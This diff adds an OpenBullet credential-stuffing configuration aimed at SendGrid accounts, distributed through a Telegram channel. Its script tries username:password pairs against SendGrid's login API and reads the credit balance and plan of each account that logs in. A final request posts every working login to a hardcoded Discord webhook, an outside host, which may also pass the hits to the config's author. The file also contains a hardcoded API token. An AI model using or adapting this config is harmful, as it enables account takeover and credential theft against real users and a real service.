@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "SendGrid V3 [ TG- @OpenbulletConfigsOfficial ]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-14T09:40:55.0571065-08:00",
+  "AdditionalInfo": "join [ TG- @OpenbulletConfigsOfficial ]",
+  "Author": "@OpenbulletConfigsOfficial",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.sendgrid.com/v3/public/tokens" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Authorization: token undefined" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 47" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: api.sendgrid.com" 
+  HEADER "Origin: https://app.sendgrid.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "authorization required" 
+    KEY "errors" 
+    KEY "Your username or password is invalid" 
+  KEYCHAIN Success OR 
+    KEY "token" 
+
+REQUEST GET "https://api.sendgrid.com/v3/user/credits" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: token 2c9d7c8949913035f624ce01277b9fca" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: api.sendgrid.com" 
+  HEADER "Origin: https://app.sendgrid.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 S" 
+
+#CREDITS PARSE "<SOURCE>" LR "\"total\":" "," CreateEmpty=FALSE -> CAP "CREDITS" 
+
+#USED PARSE "<SOURCE>" LR "\"used\":" "}" CreateEmpty=FALSE -> CAP "USED" 
+
+REQUEST GET "https://api.sendgrid.com/v3/user/account" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: token 2c9d7c8949913035f624ce01277b9fca" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: api.sendgrid.com" 
+  HEADER "Origin: https://app.sendgrid.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+
+#PLAN PARSE "<SOURCE>" LR ",\"type\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"type\":\"free\"" 
+
+#FINAL REQUEST POST "https://discordapp.com/api/webhooks/777225510149292073/86hsuMYzLjpgcLjNRfeHvHdO9mkEdw-FiNGeBNr4gqbEsAETRYrLikIB-oSaacZSNoCp" 
+  CONTENT "{\"content\":\"SENDGRID - <USER>:<PASS> /CREDITS-<CREDITS> /USED-<USED> /Plan-<Plan>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
